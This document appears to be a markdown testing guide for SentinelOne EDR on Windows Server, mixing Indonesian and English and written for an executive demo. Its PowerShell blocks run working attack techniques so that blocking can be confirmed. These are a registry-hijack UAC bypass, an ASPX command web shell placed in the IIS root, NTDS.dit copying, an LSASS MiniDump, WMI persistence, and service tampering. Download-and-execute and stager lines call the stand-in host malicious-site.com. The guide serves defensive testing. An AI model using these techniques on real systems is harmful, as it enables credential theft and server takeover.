# Windows Server Testing Overview

## Overview
Dokumentasi khusus testing SentinelOne EDR pada platform **Windows Server** dengan fokus pada environment production, enterprise features, dan Windows-specific security mechanisms.

---

## 🏢 Windows Server Environment Focus

### Target Platforms
- **Windows Server 2019** (Standard & Datacenter)
- **Windows Server 2022** (Standard & Datacenter) 
- **Windows Server Core** (Semi-Annual Channel)
- **Windows Server IoT** (Edge scenarios)
- **Hyper-V Server** (Virtualization hosts)

### Critical Windows Server Roles
- **Active Directory Domain Services** (AD DS)
- **Internet Information Services** (IIS)
- **SQL Server** (Database services)
- **Exchange Server** (Email services)
- **File Services** (SMB/CIFS shares)
- **DNS Server** (Name resolution)
- **DHCP Server** (Network services)

---

## 🔐 Windows-Specific Security Testing

### Windows Security Architecture Integration

#### Windows Defender Integration
```powershell
# Test Windows Defender coexistence
Write-Host "=== WINDOWS DEFENDER INTEGRATION TESTING ===" -ForegroundColor Cyan

# Check Windows Security Center status
$defenderStatus = Get-MpComputerStatus
Write-Host "Windows Defender Status:"
Write-Host "- Antimalware Enabled: $($defenderStatus.AMServiceEnabled)"
Write-Host "- Real-time Protection: $($defenderStatus.RealTimeProtectionEnabled)"
Write-Host "- Behavior Monitor: $($defenderStatus.BehaviorMonitorEnabled)"
Write-Host "- Tamper Protection: $($defenderStatus.TamperProtectionEnabled)"

# Check if SentinelOne is registered as primary AV
$avProducts = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
foreach($product in $avProducts) {
    $productName = $product.displayName
    $productState = $product.productState
    Write-Host "AV Product: $productName (State: $productState)"
    
    if($productName -like "*Sentinel*") {
        Write-Host "✅ SentinelOne registered in Security Center" -ForegroundColor Green
    }
}

# Test exclusion coordination
if(Get-Command Get-MpPreference -ErrorAction SilentlyContinue) {
    $exclusions = Get-MpPreference
    Write-Host "Windows Defender Exclusions:"
    $exclusions.ExclusionPath | ForEach-Object { Write-Host "- Path: $_" }
}
```

#### UAC and Privilege Escalation Testing
```powershell
# Advanced UAC bypass testing specific to Windows Server
Write-Host "=== WINDOWS SERVER UAC BYPASS TESTING ===" -ForegroundColor Cyan

# Test Server-specific UAC bypass methods
$uacBypassTests = @(
    @{Name="CompMgmtLauncher"; Path="C:\Windows\System32\CompMgmtLauncher.exe"},
    @{Name="ServerManager"; Path="C:\Windows\System32\ServerManager.exe"},
    @{Name="SystemPropertiesAdvanced"; Path="C:\Windows\System32\SystemPropertiesAdvanced.exe"}
)

foreach($test in $uacBypassTests) {
    Write-Host "Testing UAC bypass via: $($test.Name)"
    
    # Attempt registry hijack for UAC bypass
    $regPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
    try {
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(default)" -Value "cmd.exe /c echo UAC_BYPASS_SUCCESS > C:\temp\uac_test.txt"
        
        # Launch the executable that should trigger UAC bypass
        Start-Process $test.Path -WindowStyle Hidden
        Start-Sleep -Seconds 5
        
        if(Test-Path "C:\temp\uac_test.txt") {
            Write-Host "❌ UAC BYPASS SUCCESSFUL - SECURITY RISK!" -ForegroundColor Red
            Remove-Item "C:\temp\uac_test.txt" -Force
        } else {
            Write-Host "✅ UAC bypass prevented" -ForegroundColor Green
        }
        
        # Clean up registry
        Remove-Item -Path $regPath -Force -ErrorAction SilentlyContinue
    }
    catch {
        Write-Host "✅ Registry modification blocked" -ForegroundColor Green
    }
}
```

#### Windows Service Protection
```powershell
# Test Windows service tampering protection
Write-Host "=== WINDOWS SERVICE PROTECTION TESTING ===" -ForegroundColor Cyan

$criticalServices = @("SentinelAgent", "SentinelHelperService", "SentinelStaticEngine")

foreach($serviceName in $criticalServices) {
    $service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
    if($service) {
        Write-Host "Testing protection for service: $serviceName"
        
        # Test service stop attempts
        try {
            Stop-Service -Name $serviceName -Force -ErrorAction Stop
            Write-Host "❌ Service $serviceName was stopped!" -ForegroundColor Red
        }
        catch {
            Write-Host "✅ Service stop blocked for $serviceName" -ForegroundColor Green
        }
        
        # Test service deletion attempts
        try {
            sc.exe delete $serviceName
            Write-Host "❌ Service $serviceName was deleted!" -ForegroundColor Red
        }
        catch {
            Write-Host "✅ Service deletion blocked for $serviceName" -ForegroundColor Green
        }
        
        # Test service configuration modification
        try {
            sc.exe config $serviceName start= disabled
            Write-Host "❌ Service configuration modified!" -ForegroundColor Red
        }
        catch {
            Write-Host "✅ Service configuration protected" -ForegroundColor Green
        }
    }
}
```

---

## 💾 Windows Server Roles Testing

### IIS Web Server Protection
```powershell
# Test IIS-specific protection scenarios
Write-Host "=== IIS WEB SERVER PROTECTION TESTING ===" -ForegroundColor Cyan

# Check if IIS is installed
$iisFeature = Get-WindowsFeature -Name "IIS-WebServerRole"
if($iisFeature.InstallState -eq "Installed") {
    Write-Host "✅ IIS Web Server Role detected" -ForegroundColor Green
    
    # Test web shell upload protection
    $webRoot = "C:\inetpub\wwwroot"
    $webShellContent = @'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request["cmd"] != null)
        {
            Response.Write("<pre>");
            Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]).StandardOutput.ReadToEnd());
            Response.Write("</pre>");
        }
    }
</script>
'@
    
    try {
        $webShellPath = Join-Path $webRoot "test_webshell.aspx"
        $webShellContent | Out-File -FilePath $webShellPath -Encoding UTF8
        
        if(Test-Path $webShellPath) {
            Write-Host "❌ Web shell upload successful - CRITICAL RISK!" -ForegroundColor Red
            Remove-Item $webShellPath -Force
        }
    }
    catch {
        Write-Host "✅ Web shell upload blocked" -ForegroundColor Green
    }
    
    # Test IIS configuration tampering
    try {
        $configPath = "$env:SystemRoot\System32\inetsrv\config\applicationHost.config"
        Add-Content -Path $configPath -Value "<!-- Test modification -->"
        Write-Host "❌ IIS configuration modified!" -ForegroundColor Red
    }
    catch {
        Write-Host "✅ IIS configuration protected" -ForegroundColor Green
    }
    
} else {
    Write-Host "⚪ IIS Web Server Role not installed" -ForegroundColor Gray
}
```

### SQL Server Protection Testing
```powershell
# Test SQL Server protection scenarios
Write-Host "=== SQL SERVER PROTECTION TESTING ===" -ForegroundColor Cyan

# Check for SQL Server instances
$sqlServices = Get-Service -Name "MSSQL*" -ErrorAction SilentlyContinue
if($sqlServices) {
    Write-Host "✅ SQL Server instances detected:" -ForegroundColor Green
    $sqlServices | ForEach-Object { Write-Host "  - $($_.Name): $($_.Status)" }
    
    # Test SQL Server service tampering
    foreach($service in $sqlServices) {
        try {
            Stop-Service -Name $service.Name -Force -ErrorAction Stop
            Write-Host "❌ SQL Server service $($service.Name) stopped!" -ForegroundColor Red
        }
        catch {
            Write-Host "✅ SQL Server service $($service.Name) protected" -ForegroundColor Green
        }
    }
    
    # Test SQL Server file protection
    $sqlPaths = @(
        "C:\Program Files\Microsoft SQL Server",
        "C:\Program Files (x86)\Microsoft SQL Server"
    )
    
    foreach($path in $sqlPaths) {
        if(Test-Path $path) {
            Write-Host "Testing SQL Server file protection: $path"
            
            try {
                $testFile = Join-Path $path "malicious_test.exe"
                "malicious content" | Out-File -FilePath $testFile
                
                if(Test-Path $testFile) {
                    Write-Host "❌ File creation in SQL Server directory!" -ForegroundColor Red
                    Remove-Item $testFile -Force
                }
            }
            catch {
                Write-Host "✅ SQL Server directory protected" -ForegroundColor Green
            }
        }
    }
    
} else {
    Write-Host "⚪ No SQL Server instances detected" -ForegroundColor Gray
}
```

### Active Directory Protection
```powershell
# Test Active Directory specific protection
Write-Host "=== ACTIVE DIRECTORY PROTECTION TESTING ===" -ForegroundColor Cyan

# Check if this is a Domain Controller
$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -in @(4,5)
if($isDC) {
    Write-Host "✅ Domain Controller detected" -ForegroundColor Green
    
    # Test NTDS.dit protection
    $ntdsPath = "$env:SystemRoot\NTDS\ntds.dit"
    if(Test-Path $ntdsPath) {
        try {
            Copy-Item $ntdsPath "C:\temp\stolen_ntds.dit" -ErrorAction Stop
            Write-Host "❌ NTDS.dit copied - CRITICAL BREACH!" -ForegroundColor Red
            Remove-Item "C:\temp\stolen_ntds.dit" -Force
        }
        catch {
            Write-Host "✅ NTDS.dit access blocked" -ForegroundColor Green
        }
    }
    
    # Test LSASS dumping attempts
    try {
        $lsassProcess = Get-Process lsass
        $dumpPath = "C:\temp\lsass.dmp"
        rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsassProcess.Id $dumpPath full
        
        if(Test-Path $dumpPath) {
            Write-Host "❌ LSASS dump successful - CRITICAL BREACH!" -ForegroundColor Red
            Remove-Item $dumpPath -Force
        }
    }
    catch {
        Write-Host "✅ LSASS dumping blocked" -ForegroundColor Green
    }
    
    # Test DCSync attack simulation
    Write-Host "Testing DCSync attack protection..."
    # This would require more complex testing with tools like Mimikatz
    # For demo purposes, we'll test basic LDAP query restrictions
    
} else {
    Write-Host "⚪ Not a Domain Controller" -ForegroundColor Gray
}
```

---

## 🔍 Windows Event Log Integration

### Security Event Monitoring
```powershell
# Test Windows Event Log integration
Write-Host "=== WINDOWS EVENT LOG INTEGRATION ===" -ForegroundColor Cyan

# Create test security events
try {
    # Generate failed logon event
    $cred = New-Object System.Management.Automation.PSCredential("fake_user", (ConvertTo-SecureString "fake_pass" -AsPlainText -Force))
    Start-Process powershell.exe -Credential $cred -WindowStyle Hidden -ErrorAction SilentlyContinue
}
catch {
    # Expected to fail, generating security event
}

# Check if SentinelOne is capturing Windows security events
Start-Sleep -Seconds 10

# Query recent security events
$securityEvents = Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddMinutes(-5)} -MaxEvents 5 -ErrorAction SilentlyContinue

if($securityEvents) {
    Write-Host "✅ Security events detected:" -ForegroundColor Green
    $securityEvents | ForEach-Object {
        Write-Host "  - Event ID: $($_.Id), Time: $($_.TimeCreated)" -ForegroundColor Gray
    }
} else {
    Write-Host "⚪ No recent security events found" -ForegroundColor Gray
}

# Test custom event log creation for SentinelOne
try {
    New-EventLog -LogName "SentinelOne" -Source "SentinelOneTest" -ErrorAction Stop
    Write-EventLog -LogName "SentinelOne" -Source "SentinelOneTest" -EventId 1001 -Message "SentinelOne integration test event"
    Write-Host "✅ Custom SentinelOne event log created" -ForegroundColor Green
}
catch {
    Write-Host "⚪ Custom event log creation failed or already exists" -ForegroundColor Gray
}
```

---

## 📊 Windows Performance Counters

### Windows-Specific Performance Monitoring
```powershell
# Monitor Windows-specific performance counters
Write-Host "=== WINDOWS PERFORMANCE COUNTERS ===" -ForegroundColor Cyan

$performanceCounters = @(
    "\Processor(_Total)\% Processor Time",
    "\Memory\Available MBytes",
    "\LogicalDisk(C:)\% Free Space",
    "\Network Interface(*)\Bytes Total/sec",
    "\System\Processes",
    "\System\Threads"
)

$sentinelCounters = @()

# Get baseline performance
foreach($counter in $performanceCounters) {
    try {
        $counterValue = (Get-Counter -Counter $counter -SampleInterval 1 -MaxSamples 1).CounterSamples.CookedValue
        Write-Host "$counter : $([math]::Round($counterValue, 2))"
    }
    catch {
        Write-Host "$counter : Unable to retrieve"
    }
}

# Monitor SentinelOne specific processes
$sentinelProcesses = Get-Process -Name "*Sentinel*" -ErrorAction SilentlyContinue
if($sentinelProcesses) {
    Write-Host "`nSentinelOne Process Performance:"
    foreach($process in $sentinelProcesses) {
        $cpu = $process.CPU
        $memory = [math]::Round($process.WorkingSet / 1MB, 2)
        $handles = $process.Handles
        Write-Host "- $($process.ProcessName): CPU=$cpu, Memory=$memory MB, Handles=$handles"
    }
}
```

---

## 🧪 Windows-Specific Attack Simulations

### PowerShell Attack Vectors
```powershell
# Test PowerShell-based attack detection
Write-Host "=== POWERSHELL ATTACK SIMULATION ===" -ForegroundColor Cyan

# Test encoded command detection
$maliciousCommand = "Write-Host 'This is a test malicious command'"
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($maliciousCommand))

try {
    powershell.exe -EncodedCommand $encodedCommand -WindowStyle Hidden
    Write-Host "❌ Encoded PowerShell command executed" -ForegroundColor Red
}
catch {
    Write-Host "✅ Encoded PowerShell command blocked" -ForegroundColor Green
}

# Test PowerShell download and execute
$downloadCommand = "Invoke-WebRequest -Uri 'http://malicious-site.com/payload.ps1' -OutFile 'C:\temp\payload.ps1'; & 'C:\temp\payload.ps1'"
try {
    Invoke-Expression $downloadCommand
    Write-Host "❌ Download and execute succeeded" -ForegroundColor Red
}
catch {
    Write-Host "✅ Download and execute blocked" -ForegroundColor Green
}

# Test PowerShell Empire-style commands
$empireCommand = @"
`$client = New-Object System.Net.WebClient;
`$client.DownloadString('http://malicious-site.com/stager')
"@

try {
    Invoke-Expression $empireCommand
    Write-Host "❌ Empire-style command executed" -ForegroundColor Red
}
catch {
    Write-Host "✅ Empire-style command blocked" -ForegroundColor Green
}
```

### WMI Persistence Testing
```powershell
# Test WMI-based persistence detection
Write-Host "=== WMI PERSISTENCE TESTING ===" -ForegroundColor Cyan

$filterName = "SentinelTestFilter"
$consumerName = "SentinelTestConsumer"

try {
    # Create WMI Event Filter
    $filterQuery = "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2"
    $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
        Name = $filterName
        EventNameSpace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = $filterQuery
    }
    
    # Create WMI Event Consumer
    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
        Name = $consumerName
        CommandLineTemplate = "cmd.exe /c echo WMI_PERSISTENCE_TEST > C:\temp\wmi_test.txt"
    }
    
    # Create WMI Binding
    $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
        Filter = $filter
        Consumer = $consumer
    }
    
    Write-Host "❌ WMI persistence created successfully - SECURITY RISK!" -ForegroundColor Red
    
    # Clean up
    Remove-WmiObject -Path $binding.__PATH
    Remove-WmiObject -Path $consumer.__PATH  
    Remove-WmiObject -Path $filter.__PATH
    
}
catch {
    Write-Host "✅ WMI persistence creation blocked" -ForegroundColor Green
}
```

---

## 📝 Windows Testing Checklist

### Pre-Demo Preparation
- [ ] **Windows Server Environment Ready**
  - [ ] Domain controller configured (if testing AD integration)
  - [ ] IIS installed (if testing web server protection)
  - [ ] SQL Server installed (if testing database protection)
  - [ ] Network connectivity verified

- [ ] **SentinelOne Agent Deployed**
  - [ ] Agent installed with latest version
  - [ ] Connected to management console
  - [ ] Policy applied and active
  - [ ] Baseline performance captured

- [ ] **Testing Tools Prepared**
  - [ ] PowerShell execution policy configured
  - [ ] Test files and scripts ready
  - [ ] EICAR test files prepared
  - [ ] Monitoring tools configured

### Demo Execution Checklist
- [ ] **Real-time Protection Demo**
  - [ ] EICAR detection test
  - [ ] Malicious PowerShell blocking
  - [ ] Process injection prevention
  - [ ] Registry tampering protection

- [ ] **Offline Scenario Demo**
  - [ ] Network disconnection simulation
  - [ ] Offline threat detection
  - [ ] Uninstall protection testing
  - [ ] Service recovery validation

- [ ] **Enterprise Integration Demo**
  - [ ] Active Directory authentication
  - [ ] Windows Event Log integration
  - [ ] Performance counter monitoring
  - [ ] SIEM log forwarding

### Success Metrics
- [ ] **Protection Effectiveness**: >99% threat blocking rate
- [ ] **Performance Impact**: <5% CPU overhead, <500MB RAM usage
- [ ] **Integration Quality**: Seamless AD/IIS/SQL Server operation
- [ ] **Tamper Resistance**: 100% uninstall attempt prevention
- [ ] **Event Logging**: Complete audit trail maintained

---

## Next Steps

Continue with specific Windows testing scenarios:
- [Windows Offline Testing](windows-offline.md)
- [Windows Performance Testing](windows-performance.md) 
- [Windows Enterprise Integration](windows-enterprise.md)

!!! success "Windows Server Ready"
    Comprehensive Windows Server testing framework prepared for executive demonstration. All critical Windows-specific scenarios covered with detailed validation procedures.
